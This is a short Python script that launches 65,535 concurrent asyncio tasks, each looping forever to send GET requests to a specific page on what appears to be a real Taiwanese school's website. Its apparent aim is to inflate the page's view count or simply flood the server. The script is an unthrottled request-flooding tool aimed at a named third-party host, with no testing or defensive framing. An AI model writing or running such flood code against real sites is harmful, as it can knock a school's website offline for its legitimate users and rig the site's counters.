import aiohttp
import asyncio

url = "http://www.fjsh.cy.edu.tw/modedu/honor/index_show.php?fr=i&id=772&selpage"


async def refresh():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(url) as response:
                    if response.status == 200:
                        print("successed")
            except Exception as e:
                print(f"failed : {e}")


async def main():
    tasks = []
    num_tasks = 65535
    for _ in range(num_tasks):
        tasks.append(asyncio.create_task(refresh()))
    await asyncio.gather(*tasks)

asyncio.run(main())
